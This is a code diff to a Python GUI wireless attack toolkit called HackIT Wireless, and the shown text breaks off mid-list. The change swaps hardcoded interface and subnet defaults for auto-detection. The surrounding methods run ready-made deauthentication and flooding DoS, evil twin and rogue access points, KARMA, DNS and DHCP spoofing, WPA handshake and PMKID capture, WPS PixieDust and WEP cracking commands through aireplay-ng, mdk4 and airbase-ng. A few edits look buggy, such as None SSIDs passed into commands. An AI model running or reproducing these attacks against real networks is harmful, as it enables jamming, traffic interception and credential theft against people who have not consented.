@@ -39,6 +39,40 @@ class LocalExecutor:
     """Provides every do_* method the GUI expects, using real system tools."""
 
     @staticmethod
+    def _detect_iface():
+        try:
+            r = subprocess.run(["iw", "dev"], capture_output=True, text=True, timeout=5)
+            for line in r.stdout.splitlines():
+                if "Interface" in line:
+                    return line.split()[-1]
+        except:
+            pass
+        try:
+            r = subprocess.run(["iwconfig"], capture_output=True, text=True, timeout=5)
+            for line in r.stdout.splitlines():
+                if "IEEE 802.11" in line:
+                    return line.split()[0]
+        except:
+            pass
+        return None
+
+    @staticmethod
+    def _detect_subnet():
+        try:
+            r = subprocess.run(["ip", "route", "show", "default"], capture_output=True, text=True, timeout=5)
+            for line in r.stdout.splitlines():
+                parts = line.split()
+                for i, p in enumerate(parts):
+                    if p == "src" and i + 1 < len(parts):
+                        ip = parts[i + 1]
+                        parts = ip.split(".")
+                        if len(parts) == 4:
+                            return f"{parts[0]}.{parts[1]}.{parts[2]}.0/24"
+        except:
+            pass
+        return None
+
+    @staticmethod
     def _run(cmd, timeout=120):
         """Run shell command, return (returncode, stdout)."""
         try:
@@ -72,137 +106,159 @@ class LocalExecutor:
 
     # ── Reconnaissance ──
     @staticmethod
-    def do_crawl(interface="wlan0", timeout=15, band="both"):
+    def do_crawl(interface=None, timeout=15, band="both"):
+        interface = interface or LocalExecutor._detect_iface()
         LocalExecutor._bg(["sudo","airodump-ng","--band",band,interface,"--write","/tmp/hackit_crawl","--output-format","csv","--timeout",str(timeout)], "AP Scan")
 
     @staticmethod
-    def do_aggressive_scan(interface="wlan0", band="both"):
+    def do_aggressive_scan(interface=None, band="both"):
+        interface = interface or LocalExecutor._detect_iface()
         LocalExecutor._bg(["sudo","airodump-ng","--band",band,"--manufacture","--wps","--uptime","--output-format","csv",interface,"--write","/tmp/hackit_agg"], "Aggressive Scan")
 
     @staticmethod
-    def do_client_hunt(interface="wlan0", bssid=""):
+    def do_client_hunt(interface=None, bssid=""):
+        interface = interface or LocalExecutor._detect_iface()
         if bssid:
             LocalExecutor._bg(f"sudo airodump-ng --bssid {bssid} -c $(sudo iw dev {interface} info | grep channel | awk '{{print $2}}') --write /tmp/hackit_clients {interface} --output-format csv", "Client Hunt")
         else:
             LocalExecutor._bg(["sudo","airodump-ng","--write","/tmp/hackit_clients",interface], "Client Hunt")
 
     @staticmethod
-    def do_wpa3_detect(interface="wlan0"):
+    def do_wpa3_detect(interface=None):
+        interface = interface or LocalExecutor._detect_iface()
         LocalExecutor._bg(["sudo","airodump-ng","--wps","--band","abg",interface,"--write","/tmp/hackit_wpa3"], "WPA3 Detect")
 
     @staticmethod
-    def do_hidden_ssid(interface="wlan0"):
+    def do_hidden_ssid(interface=None):
+        interface = interface or LocalExecutor._detect_iface()
         LocalExecutor._bg(["sudo","airodump-ng","--band","abg",interface,"--write","/tmp/hackit_hidden"], "Hidden SSID")
 
     @staticmethod
-    def do_probe_monitor(interface="wlan0"):
+    def do_probe_monitor(interface=None):
+        interface = interface or LocalExecutor._detect_iface()
         LocalExecutor._bg(["sudo","airodump-ng","--probes","--write","/tmp/hackit_probes",interface], "Probe Monitor")
 
     @staticmethod
-    def do_beacon_analyze(interface="wlan0"):
+    def do_beacon_analyze(interface=None):
+        interface = interface or LocalExecutor._detect_iface()
         LocalExecutor._bg(["sudo","airodump-ng","--band","abg","--manufacture","--wps","--write","/tmp/hackit_beacons",interface], "Beacon Analyze")
 
     @staticmethod
-    def do_signal_monitor(interface="wlan0"):
+    def do_signal_monitor(interface=None):
+        interface = interface or LocalExecutor._detect_iface()
         LocalExecutor._bg(["sudo","airodump-ng","--band","abg","--signal","--write","/tmp/hackit_signal",interface], "Signal Monitor")
 
     @staticmethod
-    def do_dual_band(interface="wlan0"):
+    def do_dual_band(interface=None):
+        interface = interface or LocalExecutor._detect_iface()
         LocalExecutor._bg(["sudo","airodump-ng","--band","abg",interface], "Spectrum Scan")
 
     @staticmethod
-    def do_channel_survey(interface="wlan0"):
+    def do_channel_survey(interface=None):
+        interface = interface or LocalExecutor._detect_iface()
         LocalExecutor._bg(["sudo","airodump-ng","--band","abg",interface,"--write","/tmp/hackit_survey"], "Channel Survey")
 
     @staticmethod
     def do_arp_scan(subnet=""):
-        if not subnet: subnet = "192.168.1.0/24"
+        if not subnet: subnet = LocalExecutor._detect_subnet() or ""
         LocalExecutor._bg(["sudo","arp-scan","--localnet","--retry","3"] if shutil.which("arp-scan") else ["nmap","-sn","-n",subnet], "ARP Scan")
 
     @staticmethod
     def do_ping_sweep(subnet=""):
-        if not subnet: subnet = "192.168.1.0/24"
+        if not subnet: subnet = LocalExecutor._detect_subnet() or ""
         LocalExecutor._bg(["nmap","-sn","-n","--send-ip",subnet], "Ping Sweep")
 
     # ── DoS & Disruption ──
     @staticmethod
-    def do_deauth(interface="wlan0", bssid="", station="", count=10, reason=7):
+    def do_deauth(interface=None, bssid="", station="", count=10, reason=7):
+        interface = interface or LocalExecutor._detect_iface()
         if station:
             LocalExecutor._bg(f"sudo aireplay-ng -0 {count} -a {bssid} -c {station} {interface}", "Deauth")
         else:
             LocalExecutor._bg(f"sudo aireplay-ng -0 {count} -a {bssid} {interface}", "Deauth")
 
     @staticmethod
-    def do_beacon_flood(interface="wlan0", ssid="FreeWiFi", count=500, channel=6):
+    def do_beacon_flood(interface=None, ssid=None, count=500, channel=6):
+        interface = interface or LocalExecutor._detect_iface()
         if require_tool("mdk4"):
             LocalExecutor._bg(f"sudo mdk4 {interface} b -n {ssid} -c {channel}", "Beacon Flood")
         else:
-            LocalExecutor._bg(f"sudo aireplay-ng --beacon -e '{ssid}' -c {channel} -h 00:11:22:33:44:55 {interface}", "Beacon Flood")
+            LocalExecutor._bg(f"sudo aireplay-ng --beacon -e '{ssid}' -c {channel} -h AA:BB:CC:DD:EE:FF {interface}", "Beacon Flood")
 
     @staticmethod
-    def do_probe_flood(interface="wlan0", count=1000):
+    def do_probe_flood(interface=None, count=1000):
+        interface = interface or LocalExecutor._detect_iface()
         if require_tool("mdk4"):
             LocalExecutor._bg(f"sudo mdk4 {interface} p -t {count}", "Probe Flood")
         else:
             LocalExecutor._bg(f"for i in $(seq 1 {count}); do sudo aireplay-ng --test {interface} 2>/dev/null; done", "Probe Flood")
 
     @staticmethod
-    def do_auth_dos(interface="wlan0", bssid="", count=1000):
+    def do_auth_dos(interface=None, bssid="", count=1000):
+        interface = interface or LocalExecutor._detect_iface()
         if require_tool("mdk4"):
             LocalExecutor._bg(f"sudo mdk4 {interface} a -a {bssid} -r {count}", "Auth DoS")
         else:
             LocalExecutor._bg(f"sudo mdk3 {interface} a -a {bssid} -s {count}" if require_tool("mdk3") else f"for i in $(seq 1 {count}); do sudo aireplay-ng -1 0 -a {bssid} {interface} 2>/dev/null; done", "Auth DoS")
 
     @staticmethod
-    def do_assoc_flood(interface="wlan0", bssid="", count=1000):
+    def do_assoc_flood(interface=None, bssid="", count=1000):
+        interface = interface or LocalExecutor._detect_iface()
         if require_tool("mdk4"):
             LocalExecutor._bg(f"sudo mdk4 {interface} a -a {bssid} -m -r {count}", "Assoc Flood")
         else:
             LocalExecutor._bg(f"sudo mdk3 {interface} a -a {bssid} -m -s {count}" if require_tool("mdk3") else f"for i in $(seq 1 {count}); do sudo aireplay-ng -1 0 -a {bssid} {interface} 2>/dev/null; done", "Assoc Flood")
 
     @staticmethod
-    def do_eapol_start_flood(interface="wlan0", bssid="", count=500):
+    def do_eapol_start_flood(interface=None, bssid="", count=500):
+        interface = interface or LocalExecutor._detect_iface()
         if require_tool("mdk4"):
             LocalExecutor._bg(f"sudo mdk4 {interface} e -a {bssid} -t {count}", "EAPOL Start")
         else:
             tslog("[x] mdk4 required for EAPOL flood", "red")
 
     @staticmethod
-    def do_eapol_logoff(interface="wlan0", bssid="", count=500):
+    def do_eapol_logoff(interface=None, bssid="", count=500):
+        interface = interface or LocalExecutor._detect_iface()
         if require_tool("mdk4"):
             LocalExecutor._bg(f"sudo mdk4 {interface} e -a {bssid} -l -t {count}", "EAPOL Logoff")
         else:
             tslog("[x] mdk4 required for EAPOL Logoff", "red")
 
     @staticmethod
-    def do_cts_flood(interface="wlan0", count=1000, duration=500):
+    def do_cts_flood(interface=None, count=1000, duration=500):
+        interface = interface or LocalExecutor._detect_iface()
         if require_tool("mdk4"):
             LocalExecutor._bg(f"sudo mdk4 {interface} f -t {count} -d {duration}", "CTS Flood")
         else:
             tslog("[x] mdk4 required for CTS flood", "red")
 
     @staticmethod
-    def do_powersave_dos(interface="wlan0", station="", count=2000):
+    def do_powersave_dos(interface=None, station="", count=2000):
+        interface = interface or LocalExecutor._detect_iface()
         if require_tool("mdk4"):
             LocalExecutor._bg(f"sudo mdk4 {interface} p -t {station} -c {count}", "Power Save DoS")
         else:
             tslog("[x] mdk4 required for Power Save DoS", "red")
 
     @staticmethod
-    def do_disassoc_flood(interface="wlan0", bssid="", count=1000):
+    def do_disassoc_flood(interface=None, bssid="", count=1000):
+        interface = interface or LocalExecutor._detect_iface()
         LocalExecutor._bg(f"for i in $(seq 1 {count}); do sudo aireplay-ng -0 1 -a {bssid} {interface} 2>/dev/null; done", "Disassoc Flood")
 
     # ── MITM & Access ──
     @staticmethod
-    def do_eviltwin(interface="wlan0", ssid="", channel=6):
-        if not ssid: ssid = "FreeWiFi"
+    def do_eviltwin(interface=None, ssid="", channel=6):
+        interface = interface or LocalExecutor._detect_iface()
+        if not ssid: ssid = f"AP_{int(time.time() * 1000) % 10000}"
         if require_tool("airbase-ng"):
             LocalExecutor._bg(f"sudo airbase-ng -e '{ssid}' -c {channel} {interface}", "Evil Twin")
         else:
             tslog("[x] airbase-ng required for Evil Twin", "red")
 
     @staticmethod
-    def do_rogue_ap(interface="wlan0", ssid="FreeWiFi", channel=6):
+    def do_rogue_ap(interface=None, ssid=None, channel=6):
+        interface = interface or LocalExecutor._detect_iface()
         if require_tool("airbase-ng"):
             LocalExecutor._bg(f"sudo airbase-ng -e '{ssid}' -c {channel} -P {interface}", "Rogue AP")
         else:
@@ -219,22 +275,25 @@ class LocalExecutor:
             tslog("[x] arpspoof (dsniff) required", "red")
 
     @staticmethod
-    def do_wpad_attack(interface="wlan0", ssid=""):
-        if not ssid: ssid = "FreeWiFi"
+    def do_wpad_attack(interface=None, ssid=""):
+        interface = interface or LocalExecutor._detect_iface()
+        if not ssid: ssid = f"AP_{int(time.time() * 1000) % 10000}"
         if require_tool("airbase-ng") and require_tool("responder"):
             LocalExecutor._bg(f"sudo airbase-ng -e '{ssid}' -c 6 {interface}", "WPAD + Responder")
         else:
             tslog("[x] airbase-ng + responder required for WPAD attack", "red")
 
     @staticmethod
-    def do_dns_spoof(interface="wlan0", domain="", redirect=""):
+    def do_dns_spoof(interface=None, domain="", redirect=""):
+        interface = interface or LocalExecutor._detect_iface()
         if require_tool("dnsspoof"):
             LocalExecutor._bg(f"sudo dnsspoof -i {interface}" + (f" -f <(echo '{domain} A {redirect}')" if domain and redirect else ""), "DNS Spoof")
         else:
             tslog("[x] dnsspoof (dsniff) required", "red")
 
     @staticmethod
-    def do_dhcp_spoof(interface="wlan0", pool="192.168.1.100-200"):
+    def do_dhcp_spoof(interface=None, pool=None):
+        interface = interface or LocalExecutor._detect_iface()
         if require_tool("dhcpd"):
             tslog("[>] Configuring DHCP spoof on {interface} with pool {pool}", "yellow")
             LocalExecutor._bg(f"sudo dhcpd -cf /dev/null -pf /var/run/dhcpd.pid {interface}", "DHCP Spoof")
@@ -243,7 +302,8 @@ class LocalExecutor:
 
     # ── Capture & Extract ──
     @staticmethod
-    def do_handshake_capture(interface="wlan0", bssid="", timeout=60):
+    def do_handshake_capture(interface=None, bssid="", timeout=60):
+        interface = interface or LocalExecutor._detect_iface()
         ch = 6
         if bssid:
             rc, out = LocalExecutor._run(["sudo","iw","dev",interface,"info"])
@@ -252,7 +312,8 @@ class LocalExecutor:
         LocalExecutor._bg(f"sudo airodump-ng --bssid {bssid} -c {ch} -w /tmp/hackit_hs {interface} --output-format pcap" if bssid else f"sudo airodump-ng -w /tmp/hackit_hs --output-format pcap {interface}", "Handshake Capture")
 
     @staticmethod
-    def do_pmkid_capture(interface="wlan0", bssid="", timeout=30):
+    def do_pmkid_capture(interface=None, bssid="", timeout=30):
+        interface = interface or LocalExecutor._detect_iface()
         ch = 6
         if bssid:
             rc, out = LocalExecutor._run(["sudo","iw","dev",interface,"info"])
@@ -261,7 +322,8 @@ class LocalExecutor:
         LocalExecutor._bg(f"sudo airodump-ng --bssid {bssid} -c {ch} -w /tmp/hackit_pmkid --output-format pcap {interface}" if bssid else f"sudo airodump-ng -w /tmp/hackit_pmkid --output-format pcap {interface}", "PMKID Capture")
 
     @staticmethod
-    def do_wps_pixie(interface="wlan0", bssid="", timeout=180):
+    def do_wps_pixie(interface=None, bssid="", timeout=180):
+        interface = interface or LocalExecutor._detect_iface()
         if require_tool("reaver"):
             ch = 6
             if bssid:
@@ -273,34 +335,40 @@ class LocalExecutor:
             tslog("[x] reaver required for PixieDust", "red")
 
     @staticmethod
-    def do_wep_arp_replay(interface="wlan0", bssid="", count=5000):
-        LocalExecutor._bg(f"sudo aireplay-ng -3 -b {bssid} -h 00:11:22:33:44:55 {interface}", "WEP ARP Replay")
+    def do_wep_arp_replay(interface=None, bssid="", count=5000):
+        interface = interface or LocalExecutor._detect_iface()
+        LocalExecutor._bg(f"sudo aireplay-ng -3 -b {bssid} -h AA:BB:CC:DD:EE:FF {interface}", "WEP ARP Replay")
 
     @staticmethod
-    def do_wep_chopchop(interface="wlan0", bssid="", count=2000):
-        LocalExecutor._bg(f"sudo aireplay-ng -4 -b {bssid} -h 00:11:22:33:44:55 {interface}", "WEP ChopChop")
+    def do_wep_chopchop(interface=None, bssid="", count=2000):
+        interface = interface or LocalExecutor._detect_iface()
+        LocalExecutor._bg(f"sudo aireplay-ng -4 -b {bssid} -h AA:BB:CC:DD:EE:FF {interface}", "WEP ChopChop")
 
     @staticmethod
-    def do_wep_fragment(interface="wlan0", bssid="", count=3000):
-        LocalExecutor._bg(f"sudo aireplay-ng -5 -b {bssid} -h 00:11:22:33:44:55 {interface}", "WEP Fragment")
+    def do_wep_fragment(interface=None, bssid="", count=3000):
+        interface = interface or LocalExecutor._detect_iface()
+        LocalExecutor._bg(f"sudo aireplay-ng -5 -b {bssid} -h AA:BB:CC:DD:EE:FF {interface}", "WEP Fragment")
 
     # ── Offensive Network ──
     @staticmethod
-    def do_karma(interface="wlan0", channel=6, ssid="", verbose=False):
+    def do_karma(interface=None, channel=6, ssid="", verbose=False):
+        interface = interface or LocalExecutor._detect_iface()
         if require_tool("airbase-ng"):
             LocalExecutor._bg(f"sudo airbase-ng -P -C 30 -e '{ssid or 'KARMA'}' -c {channel} {interface}", "KARMA Attack")
         else:
             tslog("[x] airbase-ng required for KARMA", "red")
 
     @staticmethod
-    def do_mda(interface="wlan0", bssid="", count=100):
+    def do_mda(interface=None, bssid="", count=100):
+        interface = interface or LocalExecutor._detect_iface()
         if require_tool("mdk4"):
             LocalExecutor._bg(f"sudo mdk4 {interface} m -a {bssid} -t {count}", "MDA (Michaely)")
         else:
             tslog("[x] mdk4 required for MDA", "red")
 
     @staticmethod
-    def do_tkip_mic(interface="wlan0", bssid="", station=""):
+    def do_tkip_mic(interface=None, bssid="", station=""):
+        interface = interface or LocalExecutor._detect_iface()
         if require_tool("mdk4"):
             cmd = f"sudo mdk4 {interface} m -a {bssid}" + (f" -c {station}" if station else "")
             LocalExecutor._bg(cmd, "TKIP MIC Exploit")
@@ -308,28 +376,32 @@ class LocalExecutor:
             tslog("[x] mdk4 required for TKIP MIC", "red")
 
     @staticmethod
-    def do_wids_evasion(interface="wlan0", rate=1, count=100):
+    def do_wids_evasion(interface=None, rate=1, count=100):
+        interface = interface or LocalExecutor._detect_iface()
         if require_tool("mdk4"):
             LocalExecutor._bg(f"sudo mdk4 {interface} w -e -t {count} -s {rate}", "WIDS Evasion")
         else:
             tslog("[x] mdk4 required for WIDS evasion", "red")
 
     @staticmethod
-    def do_frag_attack(interface="wlan0", bssid="", count=500):
+    def do_frag_attack(interface=None, bssid="", count=500):
+        interface = interface or LocalExecutor._detect_iface()
         if require_tool("mdk4"):
             LocalExecutor._bg(f"sudo mdk4 {interface} f -t {count}", "Fragmentation Attack")
         else:
             tslog("[x] mdk4 required for fragmentation", "red")
 
     @staticmethod
-    def do_omerta(interface="wlan0", channel=6):
+    def do_omerta(interface=None, channel=6):
+        interface = interface or LocalExecutor._detect_iface()
         if require_tool("mdk4"):
             LocalExecutor._bg(f"sudo mdk4 {interface} d -c {channel}", "Omerta Attack")
         else:
             tslog("[x] mdk4 required for Omerta", "red")
 
     @staticmethod
-    def do_eap_hammer(interface="wlan0", bssid="", count=500):
+    def do_eap_hammer(interface=None, bssid="", count=500):
+        interface = interface or LocalExecutor._detect_iface()
         if require_tool("mdk4"):
             LocalExecutor._bg(f"sudo mdk4 {interface} e -a {bssid} -t {count}", "EAP Hammer")
         else:
@@ -345,49 +417,56 @@ class LocalExecutor:
             tslog("[x] hashcat with PMKID hash required", "red")
 
     @staticmethod
-    def do_rrb_attack(interface="wlan0", bssid=""):
+    def do_rrb_attack(interface=None, bssid=""):
+        interface = interface or LocalExecutor._detect_iface()
         if require_tool("mdk4"):
             LocalExecutor._bg(f"sudo mdk4 {interface} d", "RRB Attack")
         else:
             tslog("[x] mdk4 required for RRB attack", "red")
 
     @staticmethod
-    def do_capwap(interface="wlan0", controller=""):
+    def do_capwap(interface=None, controller=""):
+        interface = interface or LocalExecutor._detect_iface()
         if require_tool("mdk4"):
             LocalExecutor._bg(f"sudo mdk4 {interface} x", "CAPWAP Attack")
         else:
             tslog("[x] mdk4 required for CAPWAP", "red")
 
     @staticmethod
-    def do_hirb(interface="wlan0", target=""):
+    def do_hirb(interface=None, target=""):
+        interface = interface or LocalExecutor._detect_iface()
         if require_tool("mdk4"):
             LocalExecutor._bg(f"sudo mdk4 {interface} b -n HIRB", "HIRB Attack")
         else:
             tslog("[x] mdk4 required for HIRB", "red")
 
     @staticmethod
-    def do_wpa2_groupkey(interface="wlan0", bssid="", count=200):
+    def do_wpa2_groupkey(interface=None, bssid="", count=200):
+        interface = interface or LocalExecutor._detect_iface()
         if require_tool("mdk4"):
             LocalExecutor._bg(f"sudo mdk4 {interface} g -a {bssid} -t {count}", "WPA2 Group Key")
         else:
             tslog("[x] mdk4 required for group key attack", "red")
 
     @staticmethod
-    def do_bridge_attack(interface="wlan0", bridge_ip=""):
+    def do_bridge_attack(interface=None, bridge_ip=""):
+        interface = interface or LocalExecutor._detect_iface()
         if require_tool("mdk4"):
             LocalExecutor._bg(f"sudo mdk4 {interface} b", "Wireless Bridge Attack")
         else:
             tslog("[x] mdk4 required for bridge attack", "red")
 
     @staticmethod
-    def do_mac_flood(interface="wlan0", count=5000, rate=100):
+    def do_mac_flood(interface=None, count=5000, rate=100):
+        interface = interface or LocalExecutor._detect_iface()
         if require_tool("macof"):
             LocalExecutor._bg(f"sudo macof -i {interface} -n {count} -s {rate}", "MAC Flooding")
         else:
             tslog("[x] macof (dsniff) required for MAC flooding", "red")
 
     @staticmethod
-    def do_known_beacon(interface="wlan0", list="enterprise", channel=6):
+    def do_known_beacon(interface=None, list="enterprise", channel=6):
+        interface = interface or LocalExecutor._detect_iface()
         if require_tool("mdk4"):
             LocalExecutor._bg(f"sudo mdk4 {interface} b -c {channel}", "Known Beacon SSID")
         else:
@@ -989,18 +1068,18 @@ class HackITWirelessGUI:
 
     def _build_recon(self):
         return self._build_tool_grid([
-            ("AP Scan","do_crawl","Scan all APs in range",[("interface","wlan0"),("timeout",15),("band","both")]),
-            ("Aggressive Scan","do_aggressive_scan","Deep multi-channel + probes",[("interface","wlan0"),("band","both")]),
-            ("Client Hunt","do_client_hunt","Enumerate clients of target AP",[("interface","wlan0"),("bssid","")]),
-            ("WPA3 Detect","do_wpa3_detect","Detect WPA3/SAE APs",[("interface","wlan0")]),
-            ("Hidden SSID","do_hidden_ssid","Discover hidden non-broadcast SSIDs",[("interface","wlan0")]),
-            ("Probe Monitor","do_probe_monitor","Monitor probe requests from clients",[("interface","wlan0")]),
-            ("Beacon Analyze","do_beacon_analyze","Analyze beacon frames",[("interface","wlan0")]),
-            ("Signal Monitor","do_signal_monitor","Real-time signal per AP",[("interface","wlan0")]),
-            ("Spectrum Scan","do_dual_band","Dual-band utilization scan",[("interface","wlan0")]),
-            ("Channel Survey","do_channel_survey","Survey utilization all channels",[("interface","wlan0")]),
-            ("ARP Scan","do_arp_scan","ARP scan local subnet",[("subnet","192.168.1.0/24")]),
-            ("Ping Sweep","do_ping_sweep","ICMP sweep subnet",[("subnet","192.168.1.0/24")]),
+            ("AP Scan","do_crawl","Scan all APs in range",[("interface", LocalExecutor._detect_iface() or ""),("timeout",15),("band","both")]),
+            ("Aggressive Scan","do_aggressive_scan","Deep multi-channel + probes",[("interface", LocalExecutor._detect_iface() or ""),("band","both")]),
+            ("Client Hunt","do_client_hunt","Enumerate clients of target AP",[("interface", LocalExecutor._detect_iface() or ""),("bssid","")]),
+            ("WPA3 Detect","do_wpa3_detect","Detect WPA3/SAE APs",[("interface", LocalExecutor._detect_iface() or "")]),
+            ("Hidden SSID","do_hidden_ssid","Discover hidden non-broadcast SSIDs",[("interface", LocalExecutor._detect_iface() or "")]),
+            ("Probe Monitor","do_probe_monitor","Monitor probe requests from clients",[("interface", LocalExecutor._detect_iface() or "")]),
+            ("Beacon Analyze","do_beacon_analyze","Analyze beacon frames",[("interface", LocalExecutor._detect_iface() or "")]),
+            ("Signal Monitor","do_signal_monitor","Real-time signal per AP",[("interface", LocalExecutor._detect_iface() or "")]),
+            ("Spectrum Scan","do_dual_band","Dual-band utilization scan",[("interface", LocalExecutor._detect_iface() or "")]),
+            ("Channel Survey","do_channel_survey","Survey utilization all channels",[("interface", LocalExecutor._detect_iface() or "")]),
+            ("ARP Scan","do_arp_scan","ARP scan local subnet",[("subnet", LocalExecutor._detect_subnet() or "")]),
+            ("Ping Sweep","do_ping_sweep","ICMP sweep subnet",[("subnet", LocalExecutor._detect_subnet() or "")]),
         ], "\U0001f50d  RECONNAISSANCE", "Real wireless recon via airodump-ng, nmap, arp-scan")
 
     def _build_attacks(self):
@@ -1010,32 +1089,32 @@ class HackITWirelessGUI:
 
         categories = {
             "DoS & Disruption": [
-                ("DEAUTH","do_deauth","Deauth clients from AP",[("interface","wlan0"),("bssid",""),("station",""),("count",10),("reason",7),("band","2.4/5")]),
-                ("BEACON FLOOD","do_beacon_flood","Flood fake beacons",[("interface","wlan0"),("ssid","FreeWiFi"),("count",500),("channel",6),("band","2.4/5")]),
-                ("PROBE FLOOD","do_probe_flood","Mass probe requests",[("interface","wlan0"),("count",1000)]),
-                ("AUTH DoS","do_auth_dos","Exhaust AP auth table",[("interface","wlan0"),("bssid",""),("count",1000)]),
-                ("ASSOC FLOOD","do_assoc_flood","Fill AP client table",[("interface","wlan0"),("bssid",""),("count",1000)]),
-                ("EAPOL START","do_eapol_start_flood","Trigger reauth flood",[("interface","wlan0"),("bssid",""),("count",500)]),
-                ("EAPOL LOGOFF","do_eapol_logoff","Disconnect via EAPOL-Logoff",[("interface","wlan0"),("bssid",""),("count",500)]),
-                ("CTS/RTS FLOOD","do_cts_flood","Jam channel with CTS",[("interface","wlan0"),("count",1000),("duration",500)]),
-                ("Power Save DoS","do_powersave_dos","Drain client battery",[("interface","wlan0"),("station",""),("count",2000)]),
-                ("Disassoc Flood","do_disassoc_flood","Disassoc flood vs AP",[("interface","wlan0"),("bssid",""),("count",1000)]),
+                ("DEAUTH","do_deauth","Deauth clients from AP",[("interface", LocalExecutor._detect_iface() or ""),("bssid",""),("station",""),("count",10),("reason",7),("band","2.4/5")]),
+                ("BEACON FLOOD","do_beacon_flood","Flood fake beacons",[("interface", LocalExecutor._detect_iface() or ""),("ssid",""),("count",500),("channel",6),("band","2.4/5")]),
+                ("PROBE FLOOD","do_probe_flood","Mass probe requests",[("interface", LocalExecutor._detect_iface() or ""),("count",1000)]),
+                ("AUTH DoS","do_auth_dos","Exhaust AP auth table",[("interface", LocalExecutor._detect_iface() or ""),("bssid",""),("count",1000)]),
+                ("ASSOC FLOOD","do_assoc_flood","Fill AP client table",[("interface", LocalExecutor._detect_iface() or ""),("bssid",""),("count",1000)]),
+                ("EAPOL START","do_eapol_start_flood","Trigger reauth flood",[("interface", LocalExecutor._detect_iface() or ""),("bssid",""),("count",500)]),
+                ("EAPOL LOGOFF","do_eapol_logoff","Disconnect via EAPOL-Logoff",[("interface", LocalExecutor._detect_iface() or ""),("bssid",""),("count",500)]),
+                ("CTS/RTS FLOOD","do_cts_flood","Jam channel with CTS",[("interface", LocalExecutor._detect_iface() or ""),("count",1000),("duration",500)]),
+                ("Power Save DoS","do_powersave_dos","Drain client battery",[("interface", LocalExecutor._detect_iface() or ""),("station",""),("count",2000)]),
+                ("Disassoc Flood","do_disassoc_flood","Disassoc flood vs AP",[("interface", LocalExecutor._detect_iface() or ""),("bssid",""),("count",1000)]),
             ],
             "MITM & Access": [
-                ("EVIL TWIN","do_eviltwin","Clone SSID + rogue AP",[("interface","wlan0"),("ssid","FreeWiFi"),("channel",6),("band","2.4/5")]),
-                ("ROGUE AP","do_rogue_ap","Fake AP broadcast",[("interface","wlan0"),("ssid","FreeWiFi"),("channel",6),("band","2.4/5")]),
+                ("EVIL TWIN","do_eviltwin","Clone SSID + rogue AP",[("interface", LocalExecutor._detect_iface() or ""),("ssid",""),("channel",6),("band","2.4/5")]),
+                ("ROGUE AP","do_rogue_ap","Fake AP broadcast",[("interface", LocalExecutor._detect_iface() or ""),("ssid",""),("channel",6),("band","2.4/5")]),
                 ("ARP SPOOF","do_arp_spoof","MITM via ARP cache poison",[("target",""),("gateway",""),("timeout",120)]),
-                ("WPAD Attack","do_wpad_attack","WPAD proxy hijack",[("interface","wlan0"),("ssid","")]),
-                ("DNS Spoof","do_dns_spoof","Fake DNS responses",[("interface","wlan0"),("domain",""),("redirect","")]),
-                ("DHCP Spoof","do_dhcp_spoof","Rogue DHCP server",[("interface","wlan0"),("pool","192.168.1.100-200")]),
+                ("WPAD Attack","do_wpad_attack","WPAD proxy hijack",[("interface", LocalExecutor._detect_iface() or ""),("ssid","")]),
+                ("DNS Spoof","do_dns_spoof","Fake DNS responses",[("interface", LocalExecutor._detect_iface() or ""),("domain",""),("redirect","")]),
+                ("DHCP Spoof","do_dhcp_spoof","Rogue DHCP server",[("interface", LocalExecutor._detect_iface() or ""),("pool","")]),
             ],
             "Capture & Extract": [
-                ("HANDSHAKE CAPTURE","do_handshake_capture","Capture WPA 4-way",[("interface","wlan0"),("bssid",""),("timeout",60),("band","2.4/5")]),
-                ("PMKID CAPTURE","do_pmkid_capture","Capture PMKID",[("interface","wlan0"),("bssid",""),("timeout",30),("band","2.4/5")]),
-                ("WPS PIXIE","do_wps_pixie","PixieDust WPS PIN",[("interface","wlan0"),("bssid",""),("timeout",180)]),
-                ("WEP ARP REPLAY","do_wep_arp_replay","WEP ARP replay IV gen",[("interface","wlan0"),("bssid",""),("count",5000)]),
-                ("WEP CHOPCHOP","do_wep_chopchop","ChopChop WEP attack",[("interface","wlan0"),("bssid",""),("count",2000)]),
-                ("WEP FRAGMENT","do_wep_fragment","Fragmentation PRGA",[("interface","wlan0"),("bssid",""),("count",3000)]),
+                ("HANDSHAKE CAPTURE","do_handshake_capture","Capture WPA 4-way",[("interface", LocalExecutor._detect_iface() or ""),("bssid",""),("timeout",60),("band","2.4/5")]),
+                ("PMKID CAPTURE","do_pmkid_capture","Capture PMKID",[("interface", LocalExecutor._detect_iface() or ""),("bssid",""),("timeout",30),("band","2.4/5")]),
+                ("WPS PIXIE","do_wps_pixie","PixieDust WPS PIN",[("interface", LocalExecutor._detect_iface() or ""),("bssid",""),("timeout",180)]),
+                ("WEP ARP REPLAY","do_wep_arp_replay","WEP ARP replay IV gen",[("interface", LocalExecutor._detect_iface() or ""),("bssid",""),("count",5000)]),
+                ("WEP CHOPCHOP","do_wep_chopchop","ChopChop WEP attack",[("interface", LocalExecutor._detect_iface() or ""),("bssid",""),("count",2000)]),
+                ("WEP FRAGMENT","do_wep_fragment","Fragmentation PRGA",[("interface", LocalExecutor._detect_iface() or ""),("bssid",""),("count",3000)]),
             ],
         }
 
@@ -1089,21 +1168,21 @@ class HackITWirelessGUI:
             tk.Label(c, text=desc, font=("Segoe UI",7), bg=T["card"], fg=T["text_dim"]).pack(anchor="w")
 
         return self._build_tool_grid([
-            ("KARMA Attack","do_karma","Respond all probes",[("interface","wlan0"),("channel",6),("ssid",""),("verbose",False),("band","2.4/5")]),
-            ("MDA (Michaely)","do_mda","TKIP MIC exploit",[("interface","wlan0"),("bssid",""),("count",100),("band","2.4/5")]),
-            ("TKIP MIC Exploit","do_tkip_mic","Forge QoS data",[("interface","wlan0"),("bssid",""),("station","")]),
-            ("WIDS Evasion","do_wids_evasion","Rate-shift evasion",[("interface","wlan0"),("rate",1),("count",100),("band","2.4/5")]),
-            ("Fragmentation","do_frag_attack","Frame fragment bypass",[("interface","wlan0"),("bssid",""),("count",500)]),
-            ("Omerta Attack","do_omerta","Block probe responses",[("interface","wlan0"),("channel",6)]),
-            ("EAP Hammer","do_eap_hammer","802.1X DoS",[("interface","wlan0"),("bssid",""),("count",500)]),
+            ("KARMA Attack","do_karma","Respond all probes",[("interface", LocalExecutor._detect_iface() or ""),("channel",6),("ssid",""),("verbose",False),("band","2.4/5")]),
+            ("MDA (Michaely)","do_mda","TKIP MIC exploit",[("interface", LocalExecutor._detect_iface() or ""),("bssid",""),("count",100),("band","2.4/5")]),
